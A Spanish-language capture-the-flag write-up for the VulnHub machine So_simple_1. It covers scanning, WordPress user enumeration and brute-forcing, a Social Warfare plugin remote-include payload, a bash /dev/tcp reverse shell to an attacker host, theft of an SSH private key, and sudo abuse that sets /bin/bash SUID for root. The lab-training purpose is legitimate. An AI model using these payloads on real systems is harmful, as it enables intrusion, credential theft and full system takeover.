# Write Up So\_simple\_1 VulnHub

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-19 07:20 EDT
Nmap scan report for 192.168.5.194
Host is up (0.00023s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b:55:43:ef:af:d0:3d:0e:63:20:7a:f4:ac:41:6a:45 (RSA)
|   256 53:f5:23:1b:e9:aa:8f:41:e2:18:c6:05:50:07:d8:d4 (ECDSA)
|_  256 55:b7:7b:7e:0b:f5:4d:1b:df:c3:5d:a1:d7:68:a9:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: So Simple
MAC Address: 00:0C:29:F5:A8:94 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
```

### Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt,md -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.194/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,md
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd.md         (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess.md         (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 495]
/mybackup.txt         (Status: 200) [Size: 137]
/server-status        (Status: 403) [Size: 278]
Progress: 102345 / 102350 (100.00%)
/wordpress            (Status: 200) [Size: 13381]
===============================================================
Finished
===============================================================
```

Si nos vamos a `/mybackup.txt` veremos lo siguiente...

```
JEQGQYLWMUQHI3ZANNSWK4BAORUGS4ZAOBQXG43XN5ZGIIDTN5WWK53IMVZGKIDTMFTGK3DZEBRGKY3BOVZWKICJEBRWC3RHOQQHEZLNMVWWEZLSEBUXIORAN5YGK3TTMVZWC3LF
```

Es un `Base32` y decodificado quedaria algo tal que asi...

```
I have to keep this password somewhere safely because I can't remember it: opensesame
```

### wpscan

```shell
wpscan --url http://<IP>/wordpress/ --enumerate u
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.5.194/wordpress/ [192.168.5.194]
[+] Started: Wed Jun 19 07:32:38 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.5.194/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.5.194/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.5.194/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.5.194/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.15 identified (Outdated, released on 2024-01-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.5.194/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.15</generator>
 |  - http://192.168.5.194/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.15</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://192.168.5.194/wordpress/wp-content/themes/twentynineteen/
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://192.168.5.194/wordpress/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://192.168.5.194/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.5.194/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6, Match: 'Version: 1.6'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.5.194/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] max
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jun 19 07:32:41 2024
[+] Requests Done: 24
[+] Cached Requests: 37
[+] Data Sent: 7.077 KB
[+] Data Received: 46.271 KB
[+] Memory used: 201.695 MB
[+] Elapsed time: 00:00:02
```

Descubrimos 2 usuarios y tenemos una contraseña, por lo que lo probaremos en los 2 usuarios, vemos que en usuarios `max` sirve la contraseña que nos proporciono...

```
URL = http://<IP>/wordpress/wp-admin/
```

```
User = max
Password = opensesame
```

Pero poco podemos hacer ahi, si intentamos hacer un ataque de fuerza bruta a `admin` para la `password` no nos sacara nada, pero veremos que tiene un plugin vulnerable...

```shell
wpscan --url http://<IP>/wordpress/ --usernames admin --passwords <WORDLIST>
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.5.194/wordpress/ [192.168.5.194]
[+] Started: Wed Jun 19 07:26:23 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.5.194/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.5.194/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.5.194/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.5.194/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.15 identified (Outdated, released on 2024-01-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.5.194/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.15</generator>
 |  - http://192.168.5.194/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.15</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://192.168.5.194/wordpress/wp-content/themes/twentynineteen/
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://192.168.5.194/wordpress/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://192.168.5.194/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.5.194/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6, Match: 'Version: 1.6'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] simple-cart-solution
 | Location: http://192.168.5.194/wordpress/wp-content/plugins/simple-cart-solution/
 | Last Updated: 2022-04-17T20:50:00.000Z
 | [!] The version is out of date, the latest version is 1.0.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 0.2.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://192.168.5.194/wordpress/wp-content/plugins/simple-cart-solution/assets/dist/js/public.js?ver=0.2.0
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.5.194/wordpress/wp-content/plugins/simple-cart-solution/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.5.194/wordpress/wp-content/plugins/simple-cart-solution/readme.txt

[+] social-warfare
 | Location: http://192.168.5.194/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2024-04-07T19:32:00.000Z
 | [!] The version is out of date, the latest version is 4.4.6.3
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Comment (Passive Detection)
 |
 | Version: 3.5.0 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://192.168.5.194/wordpress/, Match: 'Social Warfare v3.5.0'
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - http://192.168.5.194/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.0
 |   - http://192.168.5.194/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.0
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.5.194/wordpress/wp-content/plugins/social-warfare/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.5.194/wordpress/wp-content/plugins/social-warfare/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <==============================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.
```

Vemos que tiene un plugin llamado `social-warfare` y si vamos a la siguiente pagina...

URL = https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618/

Nos explica como vulnerarlo...

```shell
echo "<pre>system('cat /etc/passwd')</pre>" > payload.txt
```

Con esto lo que haremos sera mirar el `passwd` de la maquina victima...

Ahora abrimos un servidor de `python3`....

```shell
python3 -m http.server 80
```

Una vez abierto nos vamos a la siguiente `URL`...

```
URL = http://<IP>/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://<IP>/payload.txt
```

Esto lo que hara sera coger el `.txt` que hemos creado nosotros para que vea ese archivo y ejecutarlo visualizando el `passwd`...

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
max:x:1000:1000:roel:/home/max:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false
steven:x:1001:1001:Steven,,,:/home/steven:/bin/bash
```

Por lo que vemos funciona, por lo que ahora haremos lo siguiente...

```shell
echo "<pre>system('/bin/bash -c \'exec bash -i &>/dev/tcp/<IP>/<PORT> <&1\'')</pre>" > payload.txt
```

Nos haremos una `Reverse Shell`, antes de darle a enviar, haremos lo siguiente...

```shell
nc -lvnp <PORT>
```

Y cuando estemos a la escucha, lo enviamos teniendo el servidor de `python3` abierto donde se encuentra nuestro `payload.txt`...

```
URL = http://<IP>/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://<IP>/payload.txt
```

Una vez enviado tendremos una shell con el usuario `www-data`...

Ahora sanitizamos la shell...

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si nos vamos a la `/home` del usuario `max` veremos un `personal.txt` que contiene...

```
SGFoYWhhaGFoYSwgaXQncyBub3QgdGhhdCBlYXN5ICEhISA=
```

Es una `Base64` que dice lo siguiente...

```
Hahahahaha, it's not that easy !!!
```

Por lo que no sirve para nada, pero si nos fijamos podemos entrar en el `.ssh/` de `max` y dentro estara la `id_rsa` privada la cual podemos leer, por lo que nos podremos conectar desde fuera con su `id_rsa` de la siguiente forma...

> Maquina Victima

```shell
python3 -m http.server
```

> Maquina Host

```shell
wget http://<IP_VICTIM>:8000/id_rsa
```

Una vez la tengamos en nuestro `host`...

```shell
chmod 600 id_rsa
```

```shell
ssh -i id_rsa max@<IP>
```

Y con esto ya seriamos el usuario `max`, por lo que leeremos la flag...

> user.txt (flag1)

```
073dafccfe902526cee753455ff1dbb0
```

Si hacemos `sudo -l` veremos lo siguiente...

```
Matching Defaults entries for max on so-simple:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User max may run the following commands on so-simple:
    (steven) NOPASSWD: /usr/sbin/service
```

Podremos ejecutar como el usuario `steven` ese archivo, por lo que haremos lo siguiente...

```shell
sudo -u steven /usr/sbin/service ../../bin/bash
```

o

```shell
nano shell.sh

#Dentro del nano
#!/bin/bash
/bin/bash -i
```

```shell
sudo -u steven /usr/sbin/service ../../tmp/shell.sh
```

Y con esto ya seriamos `steven`...

Leemos la flag...

> user2.txt (flag2)

```
b662b31b7d8cb9f5cdc9c2010337f9b8
```

Si hacemos `sudo -l` veremos lo siguiente...

```
Matching Defaults entries for steven on so-simple:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User steven may run the following commands on so-simple:
    (root) NOPASSWD: /opt/tools/server-health.sh
```

Podemos ejecutar ese `.sh` como `root`, pero si intentamos ir ahi no esta la carpeta ni el archivo creados, por lo que lo creamos nosotros inyectando el codigo malicioso...

```shell
mkdir /opt/tools
```

```shell
cd /opt/tools/
```

```shell
nano server-health.sh

#Dentro del nano
#!/bin/bash

chmod u+s /bin/bash
```

```shell
sudo /opt/tools/server-health.sh
```

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1183448 Feb 25  2020 /bin/bash
```

Por lo que vemos funciono y si hacemos esto ya seriamos `root`...

```shell
bash -p
```

Una vez siendo `root` leeremos la flag...

> flag.txt (flag3)

```

  /$$$$$$                                                     /$$              /$$                                   
 /$$__  $$                                                   | $$             | $$                                   
| $$  \__/  /$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$  /$$$$$$  /$$$$$$$$| $$                                   
| $$       /$$__  $$| $$__  $$ /$$__  $$ /$$__  $$|____  $$|_  $$_/ |____ /$$/| $$                                   
| $$      | $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/ /$$$$$$$  | $$      /$$$$/ |__/                                   
| $$    $$| $$  | $$| $$  | $$| $$  | $$| $$      /$$__  $$  | $$ /$$ /$$__/                                         
|  $$$$$$/|  $$$$$$/| $$  | $$|  $$$$$$$| $$     |  $$$$$$$  |  $$$$//$$$$$$$$ /$$                                   
 \______/  \______/ |__/  |__/ \____  $$|__/      \_______/   \___/ |________/|__/                                   
                               /$$  \ $$                                                                             
                              |  $$$$$$/                                                                             
                               \______/                                                                              
 /$$     /$$                  /$$                                                                           /$$      
|  $$   /$$/                 | $/                                                                          | $$      
 \  $$ /$$//$$$$$$  /$$   /$$|_//$$    /$$ /$$$$$$         /$$$$$$  /$$  /$$  /$$ /$$$$$$$   /$$$$$$   /$$$$$$$      
  \  $$$$//$$__  $$| $$  | $$  |  $$  /$$//$$__  $$       /$$__  $$| $$ | $$ | $$| $$__  $$ /$$__  $$ /$$__  $$      
   \  $$/| $$  \ $$| $$  | $$   \  $$/$$/| $$$$$$$$      | $$  \ $$| $$ | $$ | $$| $$  \ $$| $$$$$$$$| $$  | $$      
    | $$ | $$  | $$| $$  | $$    \  $$$/ | $$_____/      | $$  | $$| $$ | $$ | $$| $$  | $$| $$_____/| $$  | $$      
    | $$ |  $$$$$$/|  $$$$$$/     \  $/  |  $$$$$$$      | $$$$$$$/|  $$$$$/$$$$/| $$  | $$|  $$$$$$$|  $$$$$$$      
    |__/  \______/  \______/       \_/    \_______/      | $$____/  \_____/\___/ |__/  |__/ \_______/ \_______/      
                                                         | $$                                                        
 /$$ /$$$$$$                   /$$$$$$  /$$              | $$       /$$          /$$                                 
| $//$$__  $$                 /$$__  $$|__/              |__/      | $$         | $/                                 
|_/| $$  \__/  /$$$$$$       | $$  \__/ /$$ /$$$$$$/$$$$   /$$$$$$ | $$  /$$$$$$|_/                                  
   |  $$$$$$  /$$__  $$      |  $$$$$$ | $$| $$_  $$_  $$ /$$__  $$| $$ /$$__  $$                                    
    \____  $$| $$  \ $$       \____  $$| $$| $$ \ $$ \ $$| $$  \ $$| $$| $$$$$$$$                                    
    /$$  \ $$| $$  | $$       /$$  \ $$| $$| $$ | $$ | $$| $$  | $$| $$| $$_____/                                    
   |  $$$$$$/|  $$$$$$/      |  $$$$$$/| $$| $$ | $$ | $$| $$$$$$$/| $$|  $$$$$$$                                    
    \______/  \______/        \______/ |__/|__/ |__/ |__/| $$____/ |__/ \_______/                                    
                                                         | $$                                                        
                                                         | $$                                                        
                                                         |__/                                                        

Easy box right? Hope you've had fun! Show me the flag on Twitter @roelvb79
```
